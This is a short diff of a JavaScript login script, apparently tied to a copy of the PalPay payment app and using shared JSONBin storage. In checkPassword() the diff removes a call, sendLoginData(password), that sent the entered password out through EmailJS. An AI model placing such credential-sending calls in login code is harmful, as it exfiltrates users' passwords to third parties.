@@ -1,4 +1,4 @@
-
+ 
 /***********************
  * JSONBin — التخزين السحابي المشترك
  * يستخدم نفس الـ Bin الموجود في نسخة PalPay
@@ -1593,9 +1593,6 @@ function checkPassword() {
         confirmModal.style.display = 'none';
         codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });
 
-        // ✉️ إرسال بيانات تسجيل الدخول عبر EmailJS
-        sendLoginData(password);
-        
         showScreen('s1'); 
     } else {
         codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });
